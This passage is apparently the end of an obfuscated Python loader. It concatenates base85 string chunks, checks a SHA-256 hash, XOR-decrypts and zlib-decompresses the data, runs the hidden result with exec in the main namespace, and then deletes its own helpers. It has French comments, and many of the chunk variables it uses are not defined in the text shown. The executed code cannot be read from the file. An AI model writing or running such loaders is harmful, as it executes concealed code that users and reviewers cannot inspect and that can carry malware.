_cnfEoLtLYEPoOC = 'p76PxTj43jpj;C5{_|ou$Nl(O-b06ibQ1TpeTv!y'
_ca8S5GZdHJG7AP = '5LI0y%*J8<gmDP%$2U%}A6YN}z&57&o=oeAYQF(P'
_cfwHbCyiqyLt7m = 'nS{VoE8QvCQiM-@Y}?i%fT;B+DbskLKD~I`5#PeY'
_cy4IvCYfZ1K4bh = '0!gg^#_3iGO=hW)ZVPeR)dOb4aB{ujO!C{}d4$YR'
_clvnf6BFBdLlte = 'eM|q<6vQSJTu|vX)bPU+qO~<@P5GR4cCA4o#$BrB'
_cqbJoHzYpNDpyU = '_*Xe}`(N<bSqZ6aW(;=;1~e-%3g(imiX+P&mU?nX'
_caOZLWuihHjl1E = 'gz_f&Z+KJzC0iw~RA*}#6%l(qjt2w-uHpen&6tJ5'
_cjXDJyc0upIcVv = 'd85`!DkufcY7lN_Pj~9L(ismK&#G2v@fy`EDxy`@'
_cl7cSxk2ynOZX7 = 'z>Jrhn+h<n6@){Xku=<|QXSI9ydu5DH7KlckH79N'
_cjPPsxw46pfzdO = 'W+TL@WSoYiH5bf}`igBbXVClb4sF8T;Q(N=IsvMw'
_cbJO9KPlWKeClC = 'zl>wBf4lEdTdq9W=BfG0L9yf)K`)yQLf@7z^{t~U'
_crXTppDbXeenqE = '_SY#Nq@5YJ);I$4vel&p4OO}%>1IgN_jy>OhA1=z'
_cu9hCBMPEVxND4 = 'hC%kr=o{GB|9PftW}WidgtZV@3cxvgqfb-Gu=f_S'
_ckBUETcexgcAYn = 'HowvJsu)%-q#AlL&8v)zv}p*C%y|Um=PRrj79<@X'
_ct5p6NUfMO5FvQ = 'EJtMX+IYa23On7ruJAtT(oLbEO8'

_puFNQq_Wr1bt8q = __import__('base64').b85decode(_clFp_S68KLW22I + _cm8LAmU5Z0Zixi + _ctxltX9Xg1YDA1 + _cf1zZZLvY3qB0b + _crvMmoWfr17ipC + _cr7dX7QQokrQj7 + _ctOahK9rX8QQ0P + _coJj13oK9RmGap + _ctreN64_qfnnIa + _clKkSYC21fnPq2 + _ckLetGGwjDojVX + _csCXXzdPLV4dGM + _ctA_swNeMyvAaL + _cuKuOKtPTnNCOT + _cwvEPmKyJZTaPD + _cf0WDnLLSNFFP2 + _czpybMfT68au_w + _csDVTo6fVX_Gmt + _cwzt_0wNB3Q7K6 + _cwdHT1KEol0zAD + _cmhABfRV82zU2g + _cmdyRSMNVbH9Uu + _cljTI4_coFfmNu + _coYC3zht6WuFDj + _cymxj13UN9g8NW + _csNt5CoNsiY2q6 + _csTF65mQX6GWoP + _clWntXsArPPcIP + _ck8quVQPaRLaov + _cvEUuqExeloYWu + _cgbWU5JHxhdxtv + _cwCuoL3eCz7iR5 + _chMmGlPvVxYGVB + _c_ArIbfQ1xFptR + _chFptVPDJzZLnm + _cqgDfVDm_FtnJs + _cvTCkPhbLjjA5E + _czbJiW4JwDBbZF + _ccYRJKOPvposSl + _cq9fEWMyti94t_ + _ctYFYFa94G1j2P + _cwfZyBc4GWghk1 + _cu74FrG4UifBQM + _c_LtyT262Q6vJy + _cy4KjGazfPNynk + _ctRh4MhvvNX_qt + _ceAA5YjUgMoAxc + _cdtW4dfMgaToGx + _coArjjOJK1rjLx + _cqq8Oj9_Dw5luO + _cp5pZPIoyKWfFu + _cw9QUyPc3fLPFt + _cgc0p0kiRMzH6R + _c_mxHb5YZdxw1A + _crbH76fqtyxiss + _cpXuw6Ht7bgC97 + _cvzbkd7LBf_q_r + _cuoypwWG31QZtn + _cwgd5vXZShK_rc + _ciaB1kOaNonYdb + _cyBitvZ_o560o2 + _crZYLtz3uC4OKX + _cpzRzsRd49gnNw + _cd1c7T28w_Ngsq + _cwZC96R8gQrTBE + _cqcaxH3Eid8Jkl + _cw7WYyjZTBVotb + _ckZc3d9HQ6xl9v + _cjuIJO5jlEh5tr + _cpCdSxTFALaYTR + _ccQnuzsiBKeGul + _c_iTdPqhDKTv5P + _ciXT6LiW0nszUz + _cyFvMTxgUuhpFR + _czOCi55Hv4ktSX + _cet_Ejgfh_BxZ_ + _cf8mYo3CaN9hii + _cqo7lsnG10MG7Q + _cwhqp9tpw_qAsN + _czdyCNRVNfu8e2 + _czO1ojnnNzAcJZ + _ch2Wd3SKY2XPm7 + _cqeWkM23Yz0mXE + _ccEXvLZUXGRzFy + _cq3vttpX9q3rGg + _ctMyrY9b11sVnL + _clRzkc6QY86Xoh + _chV92i4ewVmVYs + _caxqt7s_B9yt9E + _cmZcy01_n6_oBt + _cz7SfmQto_nByQ + _cqVTFliG6uaC9A + _cnmp3OtbsfFY0c + _cyyQtzYZf8Tr_C + _cy7kJxmPuHtQU9 + _cesRh3nLSfvyje + _crIsgUuCwzc5D4 + _chv225IMWQkZX9 + _cjO0Uqddx5jcyh + _ccq2RnKs4gG7TW + _c_EAKImQAAjwLQ + _chNisyOrG7Q6pa + _cm00yRz6Z2esJg + _cpjmFRjVoqdy9e + _clgj3RqYN5Qc9O + _cg40049s3TOBMT + _ckclfnjQh6o0UQ + _cwyXmuNW3JptCR + _ckLIlAcSwwiwiG + _czb6K0fuzOWQs7 + _cuJsERGQsZZQRa + _cyDLtFCuVwWuH4 + _cjx7hVXip_HCJ2 + _chgaeg70AN3CPr + _cd8qgljG8T1s5j + _crCqkO6XnDII6u + _cc5UHKjy77sjaf + _cfwaImZ6ucLe8X + _cj5VuO6vdNt_Gv + _cnRSrKPlIGs6sk + _cuVcNPEPbCXSd8 + _citfMtIs6MHGfl + _c_9RixDvuw69mU + _creEtvdNVU1HlX + _c_0ba1HlrT8hPD + _cztUA8q6wPnXA3 + _cncTbuPehvY616 + _ca0VqtXNyhmgAR + _cqReRLsi9ecFDJ + _csBTXCSp1HxWr2 + _cfZH2xBVB875az + _cjDpdRRNEr8O15 + _cseXRbgwSGPy4_ + _csgVKV3BuTiY_L + _caftZX5E91nVWb + _cdeovY477LnUrk + _cqb9_vnr1bAcD2 + _cqJ5W370GL_V3n + _cpJHsMsldE7tZo + _c_zkuaF2HKxXDH + _csXclbirlEvRsU + _ctv2mlTIZK5Dq0 + _cjZrZYp4n8h4iw + _chJDl4MgeFnkgg + _cwtqBfNZrTWDbv + _cuUYqSStKkhXIb + _cpxYw9TOagtTaE + _cnI8vAAfCUqfPA + _clgLhOfNhi_f2C + _cxGHjZ8VvQ4Xdx + _cfKYfo0wMosMI8 + _caEE9Sr3YTZ7kj + _ctTwboxwUiU0dU + _ce0D0hlFVBo6BW + _cfIXZYM41YIlpb + _cvv6jdKGdS3b9o + _ceLs6AjqnbmBzS + _cqBRFvciChbTxk + _cbnchV9WNUHYoq + _chzWWpAAJLHP1c + _cxumFnOyr6HoLm + _cquXAWaBp8POfp + _cojp9o4EDNzR3O + _cwh8fibOGk3EMm + _cmGYcJQp4fPmxb + _cv39Rn7u5mAvVB + _c_GD0qcdTPcg3p + _cyhabhoJkivQZL + _ccQAIpUMltFPKn + _cy9HDIBW21ukfw + _c_IVyo6rMzWBs1 + _ch5U8QpMFPVZhB + _cdICEQVkAV2wdK + _cf0Yd81JTp50jq + _cgmU2UM0kdwRMR + _czoaAkGKeRynfu + _cgsYI8sxbVJh1k + _caOPxp5Ng8Vy05 + _cswjvz5pFhuABs + _cqodNgP0R6ecmj + _cmfWvQ2nVqTlBQ + _cgI0lg9qfGrYhz + _ckTYasdUz0ugOD + _cr1TYmqobQ4qtG + _chOmDq6FyThl3o + _cc65uiFMDBpFeX + _cslzTdUFQrz4v0 + _cfk4BligB7r1cO + _czngrhukORbsMm + _ca5j9A2gXLuSWU + _cmvRYPekEqeXJU + _cdfHkEu38v1Ni5 + _cxQ9R6PimaTbzg + _chOgZYG3puRxY3 + _cyQOlkaoaoondg + _cuLOhfKHMJNL05 + _cwMqLNgt2O8FEq + _chsk28NlpG8KbH + _ccLtA1bfaRUuSM + _cmXtifB56qKFms + _csO0irsBRrFqaw + _ctlThm12czDe_k + _cj0uv1iWtVfC_F + _ckmQrF_vOZ8DPn + _cddrHSf9QssVRe + _coH9uEfeR1WsYq + _cbED77LAM0VSmr + _czUt1V5502KzGv + _cquCDqHp0ihLsI + _cj_GcJrWReWnJP + _cpfLMKuHqS8QMJ + _cnaj_2eS4vNwwx + _cebMql1oy1KlDA + _cd3RMSmAC6ZtFZ + _czEwrzOysPec9T + _ckqhU0sWZseGrb + _ch0KgD8_JwH4H8 + _cpIIqTJYJa3WLu + _cjRSidKUXvDEKR + _cuyhKYMctUiZyf + _ckItqZDTNvquhW + _c_3gJDXw0QYqDO + _cfqYhJ4FW5qfxp + _cm3VfQV3CstWnX + _cdreojfwJA4D8i + _cjeHCDR1X7Yq6g + _cbTeDGonGRluOP + _csg8rPhxzvpokd + _csvWfUkiYEa5zW + _cfC2fAvIkZiRwW + _cu4sSzcR4klo4i + _cgDoroXFrLOtEN + _ci8jJvnAwHSEBg + _cpl0O4p4XGRu6D + _cp4fxuV42Hw4cD + _clbTsAJ5RGldfu + _coBxlSZpwG8JGt + _cdLLN10vxDXU5r + _cvddNW144WAZwN + _cc9QnRb1yNyM5b + _ctEqxqCnliW9TG + _ccjYNrhNvCQ3YD + _cmedUDYp7HHcNx + _c_Iamcindj3v3P + _cc4Ui7TaRe6_J3 + _cnfEoLtLYEPoOC + _ca8S5GZdHJG7AP + _cfwHbCyiqyLt7m + _cy4IvCYfZ1K4bh + _clvnf6BFBdLlte + _cqbJoHzYpNDpyU + _caOZLWuihHjl1E + _cjXDJyc0upIcVv + _cl7cSxk2ynOZX7 + _cjPPsxw46pfzdO + _cbJO9KPlWKeClC + _crXTppDbXeenqE + _cu9hCBMPEVxND4 + _ckBUETcexgcAYn + _ct5p6NUfMO5FvQ)
if __import__('hashlib').sha256(_puFNQq_Wr1bt8q).hexdigest() != 'f2bba38186e7a25135a20a90bc1b97cc21fc29c03c185e324214c73f1cedafad':
    __import__('sys').exit(1)
_xb67Qw_K9z_wym = bytes([88, 214, 79, 100, 235, 25, 229, 224, 20, 79, 133, 35, 173, 203, 59, 125, 153, 250, 146, 64, 6, 166, 198, 22, 209, 76, 19, 135, 181, 244])
_fkmBIFY7OcKoOI3 = bytes([37, 83, 196, 153, 123, 199, 59, 210, 95, 157, 180, 28, 111, 37, 249, 161, 164, 96, 95, 46, 92, 103, 249, 142, 104, 29, 55, 219, 229, 157])

def _fxleO7lRutmF2N1(_bbLuWNM7jKwB_O, _krUQvkscIcdg3d):
    return bytes(_bbLuWNM7jKwB_O[_iydeCrZSJqKmid] ^ _krUQvkscIcdg3d[_iydeCrZSJqKmid % len(_krUQvkscIcdg3d)] for _iydeCrZSJqKmid in range(len(_bbLuWNM7jKwB_O)))

def _fd_MfdidDFtUnl_(_tz_B_uWd3EU7qr):
    import zlib
    return zlib.decompress(_tz_B_uWd3EU7qr) # Un seul niveau de zlib ici pour simplifier

def _felRZt2ByyrFoPX():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xrRC2IrOhjr2n4 = _fxleO7lRutmF2N1(_puFNQq_Wr1bt8q, _xb67Qw_K9z_wym)
    # 2. Décompression Zlib
    _du_SuWTv1bv9jt = _fd_MfdidDFtUnl_(_xrRC2IrOhjr2n4)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _du_SuWTv1bv9jt.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nprp1gdCMYZLBB = _main.__dict__
    _nprp1gdCMYZLBB.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nprp1gdCMYZLBB)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_felRZt2ByyrFoPX()
try:
    del _fxleO7lRutmF2N1, _fd_MfdidDFtUnl_, _felRZt2ByyrFoPX
    del _puFNQq_Wr1bt8q, _xb67Qw_K9z_wym, _fkmBIFY7OcKoOI3
except:
    pass
